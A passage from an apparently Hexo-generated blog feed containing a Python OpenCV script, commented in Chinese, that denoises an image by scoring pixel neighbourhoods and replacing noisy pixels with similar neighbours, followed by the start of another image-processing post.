class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3.8</span></span><br><span class="line"><span class="comment"># utf-8</span></span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">threshold = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PixelChannel</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, channel, noise, row, col</span>):</span></span><br><span class="line">        self.noise = noise</span><br><span class="line">        self.channel = channel</span><br><span class="line">        self.row = row</span><br><span class="line">        self.col = col</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Part</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y, area</span>):</span></span><br><span class="line">        self.x = x</span><br><span class="line">        self.y = y</span><br><span class="line">        self.area = area</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取左上角</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_1</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取右上角</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_2</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取左下角</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_3</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取右下角</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">half_4</span>(<span class="params">pixel_channel</span>):</span></span><br><span class="line">    row = pixel_channel.row</span><br><span class="line">    col = pixel_channel.col</span><br><span class="line">    half_row = row // <span class="number">2</span></span><br><span class="line">    half_col = col // <span class="number">2</span></span><br><span class="line">    channel = np.zeros((half_row + <span class="number">1</span>, half_col + <span class="number">1</span>), dtype=<span class="built_in">type</span>(pixel_channel.channel))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row, <span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col, <span class="number">2</span>):</span><br><span class="line">            channel[i // <span class="number">2</span>][j // <span class="number">2</span>] = pixel_channel.channel[i][j]</span><br><span class="line">    result = PixelChannel(channel, noise_check(channel), half_row, half_col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立像素通道类</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_pixel_channel</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = PixelChannel(img_channel, noise_check(img_channel), row, col)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division1</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p1 = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line">          _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p = <span class="built_in">sorted</span>(p1)</span><br><span class="line">    q = [<span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>])),</span><br><span class="line">         <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>])), <span class="built_in">abs</span>(<span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]))]</span><br><span class="line">    <span class="comment"># 判断区分度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(q) &lt; <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> result, <span class="literal">False</span></span><br><span class="line">    max_index = q.index(<span class="built_in">max</span>(q))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">        result[p1.index(p[i])] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> result[i] != <span class="number">1</span>:</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑位置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">division2</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    result = [<span class="number">0</span>] * <span class="number">8</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    d = [<span class="built_in">int</span>(p[<span class="number">0</span>]) - <span class="built_in">int</span>(p[<span class="number">1</span>]), <span class="built_in">int</span>(p[<span class="number">1</span>]) - <span class="built_in">int</span>(p[<span class="number">2</span>]), <span class="built_in">int</span>(p[<span class="number">2</span>]) - <span class="built_in">int</span>(p[<span class="number">3</span>]), <span class="built_in">int</span>(p[<span class="number">3</span>]) - <span class="built_in">int</span>(p[<span class="number">4</span>]),</span><br><span class="line">         <span class="built_in">int</span>(p[<span class="number">4</span>]) - <span class="built_in">int</span>(p[<span class="number">5</span>]), <span class="built_in">int</span>(p[<span class="number">5</span>]) - <span class="built_in">int</span>(p[<span class="number">6</span>]), <span class="built_in">int</span>(p[<span class="number">6</span>]) - <span class="built_in">int</span>(p[<span class="number">7</span>]), <span class="built_in">int</span>(p[<span class="number">7</span>]) - <span class="built_in">int</span>(p[<span class="number">0</span>])]</span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    min_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> d[i] &gt; d[max_index]:</span><br><span class="line">            max_index = i</span><br><span class="line">        <span class="keyword">if</span> d[i] &lt; d[min_index]:</span><br><span class="line">            min_index = i</span><br><span class="line">    <span class="keyword">if</span> max_index == min_index:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &gt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> max_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> max_index &lt; min_index:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, max_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">2</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(max_index + <span class="number">1</span>, min_index + <span class="number">1</span>):</span><br><span class="line">            result[i] = <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_index &lt; <span class="number">7</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(min_index + <span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">                result[i] = <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> result, <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 一维数组映射到二维</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_1d_2_2d</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">2</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> x == <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 特殊值处理</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">special_check</span>(<span class="params">_8area</span>):</span></span><br><span class="line">    p = [_8area[<span class="number">0</span>][<span class="number">0</span>], _8area[<span class="number">0</span>][<span class="number">1</span>], _8area[<span class="number">0</span>][<span class="number">2</span>], _8area[<span class="number">1</span>][<span class="number">2</span>],</span><br><span class="line">         _8area[<span class="number">2</span>][<span class="number">2</span>], _8area[<span class="number">2</span>][<span class="number">1</span>], _8area[<span class="number">2</span>][<span class="number">0</span>], _8area[<span class="number">1</span>][<span class="number">0</span>]]</span><br><span class="line">    p_sum = <span class="built_in">int</span>(p[<span class="number">0</span>]) + <span class="built_in">int</span>(p[<span class="number">1</span>]) + <span class="built_in">int</span>(p[<span class="number">2</span>]) + <span class="built_in">int</span>(p[<span class="number">3</span>]) + <span class="built_in">int</span>(p[<span class="number">4</span>]) + <span class="built_in">int</span>(p[<span class="number">5</span>]) + <span class="built_in">int</span>(p[<span class="number">6</span>]) + <span class="built_in">int</span>(p[<span class="number">7</span>])</span><br><span class="line">    max_differ = <span class="number">0</span></span><br><span class="line">    max_index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>) &gt; max_differ:</span><br><span class="line">            max_differ = <span class="built_in">abs</span>(<span class="built_in">int</span>(p[i]) - (p_sum - <span class="built_in">int</span>(p[i])) // <span class="number">7</span>)</span><br><span class="line">            max_index = i</span><br><span class="line">    <span class="keyword">if</span> max_differ &gt; <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span> _1d_2_2d(max_index)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">noise_check</span>(<span class="params">img_channel</span>):</span></span><br><span class="line">    (row, col) = img_channel.shape</span><br><span class="line">    result = [[<span class="number">0</span>] * col <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, row - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, col - <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># _8_area = type(img_channel)</span></span><br><span class="line">            _8_area = [[<span class="number">0</span>] * <span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">0</span>] = img_channel[i - <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">1</span>] = img_channel[i - <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">0</span>][<span class="number">2</span>] = img_channel[i - <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">2</span>] = img_channel[i][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">2</span>] = img_channel[i + <span class="number">1</span>][j + <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">1</span>] = img_channel[i + <span class="number">1</span>][j]</span><br><span class="line">            _8_area[<span class="number">2</span>][<span class="number">0</span>] = img_channel[i + <span class="number">1</span>][j - <span class="number">1</span>]</span><br><span class="line">            _8_area[<span class="number">1</span>][<span class="number">0</span>] = img_channel[i][j - <span class="number">1</span>]</span><br><span class="line">            <span class="comment"># 不考虑位置</span></span><br><span class="line">            part1, flag1 = division1(_8_area)</span><br><span class="line">            <span class="comment"># 考虑位置</span></span><br><span class="line">            part2, flag2 = division2(_8_area)</span><br><span class="line">            <span class="keyword">if</span> flag1 == <span class="literal">False</span> <span class="keyword">or</span> flag2 == <span class="literal">False</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># 处理特殊值</span></span><br><span class="line">            sx, sy = special_check(_8_area)</span><br><span class="line">            <span class="keyword">if</span> sx != -<span class="number">1</span>:</span><br><span class="line">                result[i - <span class="number">1</span> + sx][j - <span class="number">1</span> + sy] += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 比较</span></span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">if</span> part1[k] != part2[k]:</span><br><span class="line">                    x, y = _1d_2_2d(k)</span><br><span class="line">                    result[i - <span class="number">1</span> + x][j - <span class="number">1</span> + y] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找到最合适的值</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_best</span>(<span class="params">pixel_channel, x, y</span>):</span></span><br><span class="line">    p = pixel_channel.channel[x][y]</span><br><span class="line">    <span class="comment"># 建立领域列表</span></span><br><span class="line">    neighborhood = []</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][</span><br><span class="line">        y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x - <span class="number">1</span>][</span><br><span class="line">        y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x - <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][</span><br><span class="line">        y + <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y + <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][y] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x + <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x + <span class="number">1</span>][</span><br><span class="line">        y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x + <span class="number">1</span>][y - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> pixel_channel.row &gt; x &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.col &gt; y - <span class="number">1</span> &gt;= <span class="number">0</span> <span class="keyword">and</span> pixel_channel.noise[x][y - <span class="number">1</span>] &lt; threshold:</span><br><span class="line">        neighborhood.append(pixel_channel.channel[x][y - <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 搜索与给定点最接近的非噪声点</span></span><br><span class="line">    <span class="comment"># 建立差值列表</span></span><br><span class="line">    d = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(neighborhood)):</span><br><span class="line">        d.append(<span class="built_in">abs</span>(<span class="built_in">int</span>(neighborhood[i]) - <span class="built_in">int</span>(p)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(d) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> p</span><br><span class="line">    min_index = d.index(<span class="built_in">min</span>(d))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> neighborhood[min_index]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑缩小二分之一图像</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repair</span>(<span class="params">pixel_channel, half_channel</span>):</span></span><br><span class="line">    <span class="comment"># 左上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">0</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">0</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span>] += half_channel[<span class="number">0</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右上角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">1</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">1</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">1</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 左下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">2</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">2</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span>] += half_channel[<span class="number">2</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 右下角</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(half_channel[<span class="number">3</span>].col):</span><br><span class="line">            <span class="keyword">if</span> half_channel[<span class="number">3</span>].noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.noise[i * <span class="number">2</span> + <span class="number">1</span>][j * <span class="number">2</span> + <span class="number">1</span>] += half_channel[<span class="number">3</span>].noise[i][j]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.row):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(pixel_channel.col):</span><br><span class="line">            <span class="keyword">if</span> pixel_channel.noise[i][j] &gt;= threshold:</span><br><span class="line">                pixel_channel.channel[i][j] = find_best(pixel_channel, i, j)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pixel_channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 图像地址</span></span><br><span class="line">    img_address = <span class="string">&quot;img_noise.png&quot;</span></span><br><span class="line">    <span class="comment"># 以BGR方式读入图像</span></span><br><span class="line">    img = cv.imread(img_address, <span class="number">1</span>)</span><br><span class="line">    cv.imshow(<span class="string">&quot;img_noise.png&quot;</span>, img)</span><br><span class="line">    <span class="comment"># 通道分离</span></span><br><span class="line">    channel_b, channel_g, channel_r = cv.split(img)</span><br><span class="line">    <span class="comment"># 建立像素通道类</span></span><br><span class="line">    b = create_pixel_channel(channel_b)</span><br><span class="line">    g = create_pixel_channel(channel_g)</span><br><span class="line">    r = create_pixel_channel(channel_r)</span><br><span class="line">    <span class="comment"># 缩小二分之一</span></span><br><span class="line">    half_b = [half_1(b), half_2(b), half_3(b), half_4(b)]</span><br><span class="line">    half_g = [half_1(g), half_2(g), half_3(g), half_4(g)]</span><br><span class="line">    half_r = [half_1(r), half_2(r), half_3(r), half_4(r)]</span><br><span class="line"></span><br><span class="line">    new_img = cv.merge((repair(b, half_b).channel, repair(g, half_g).channel, repair(r, half_r).channel))</span><br><span class="line"></span><br><span class="line">    cv.imwrite(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.imshow(<span class="string">&quot;denoised_img.png&quot;</span>, new_img)</span><br><span class="line">    cv.waitKey()</span><br><span class="line">    cv.destroyAllWindows()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 图像处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> opencv </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图像处理20210718</title>
      <link href="/20210718-img-report/"/>
      <url>/20210718-img-report/</url>
      
